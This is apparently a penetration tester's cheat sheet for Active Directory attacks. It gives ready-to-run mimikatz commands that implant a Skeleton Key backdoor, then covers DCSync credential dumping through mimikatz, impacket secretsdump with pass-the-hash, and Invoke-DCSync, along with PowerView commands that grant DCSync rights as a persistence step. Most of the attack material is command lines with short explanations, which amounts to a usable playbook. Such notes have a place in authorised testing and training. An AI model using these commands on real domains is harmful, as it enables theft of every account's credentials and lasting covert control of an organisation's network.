Microsoft, as part of their [strategy to mitigate advanced attacks like Pass-the-Hash (PtH](https://centrify.force.com/support/Article/Security-Corner-Centrify-and-the-Microsoft-Enhanced-Security-Administrative-Environment-1-3-30966)) and others has established new best practices around the krbtgt account, but that’s the topic for another post.

### Skeleton key
+ kerberos backdoor works by implanting a skeleton key that abuese the way that the as-req validates encrypted timestamps. A skeleton key only works using Kerberos RC4 encryption. 
+ need domain admin privilege.
+ default credentials is "mimikatz"

```bash
# mimikatz
privilege::debug

# install the skeleton key
misc::skeleton

# access the forest
## no need the administrator password.
net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz
dir \\Desktop-1\c$ /user:Machine1 mimikatz
```

### DC Sync
+ The DCSync permission implies having these permissions over the domain itself: DS-Replication-Get-Changes, Replicating Directory Changes All and Replicating Directory Changes In Filtered Set.
+ defaut group with dcsync: Domain Admins, Enterprise Admins, Administrators, and Domain Controllers groups
+ steal password hash
  > 1-all administrator user in domain
  > 2-need dc, dump via mimikatz
  > 3-steal a copy of NTDS.dit, copy of all Active Directory account stored in hard drive, similar to the SAM db used for local account.
  > 4-will leave access trial and require to upload tools

**abuse AD functionality**
> DCSync attack simulates the behavior of a Domain Controller and asks other Domain Controllers to replicate information using the Directory Replication Service Remote Protocol (MS-DRSR). Because MS-DRSR is a valid and necessary function of Active Directory, it cannot be turned off or disabled.
> 1-capture hashes remotely from a workstation
> 2-prod, multi dc to provide redundancy. The Directory Replication Service Remote Protocol701 uses replication702 to synchronize these redundant domain controllers. A domain controller may request an update for a specific object, like an account, with the IDL_DRSGetNCChanges703 API.
> 3-the domain controller receiving a request for an update does not verify that the request came from a known domain controller, but only that the associated SID has appropriate privileges. 
> 4-attempt to issue a rogue update request to a domain controller from a user who is a member of the Domain Admins group, it will succeed.

**for more info**
> 700 (Microsoft, 2017), https://technet.microsoft.com/en-us/library/cc961761.aspx
701 (Microsoft, 2017), https://msdn.microsoft.com/en-us/library/cc228086.aspx
702 (Microsoft, 2016), https://technet.microsoft.com/en-us/library/cc772726(v=ws.10).aspx
703 (Microsoft, 2017), https://msdn.microsoft.com/en-us/library/dd207691.aspx
704 (Benjamin Delphy, 2016), https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump

```bash
# check permission with powerview
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}

# Exploit locally
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'

# remote: mimikatz, -导出所有用户hash，需考虑免杀问题
## ask a dc to synchronize an object(get password data for account_
## dump via dcsync on dc, from NTDS.DIT
## /all, DCSync pull data for the entire domain
## /user, user id or sid of the user to pull the data for.
## /domain, optional
## /csv, export to csv
## /dc, optional, specify the domain controller
mimikatz.exe "privilege::debug" "log dcdump.log" "lsadump::dcsync /domain:test.domain.com /all /csv" exit

## user， 指定要同步的user
lsadump::dcsync /user:Administrator

# remote, impacket
## backup account with DCSync Privileges
## -just-dc Extract only NTDS.DIT data (NTLM hashes and Kerberos keys)
## target, domain name/user:password@ip
## hash also works
secretsdump.py -just-dc spookysec.local/backup:backup2517860@$tip
impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:0f49aab58dd8fb314e268c4c6a65dfc9 -just-dc PENTESTLAB/dc\@10.0.0.1

# Powershell  Invoke-DCSync
Invoke-DCSync
Invoke-DCSync -PWDumpFormat

# persistent
## powerview grant this permissions to any user
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose

## check if the user was correctly assigned the 3 privileges looking for them in the output of (you should be able to see the names of the privileges inside the "ObjectType" field):
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```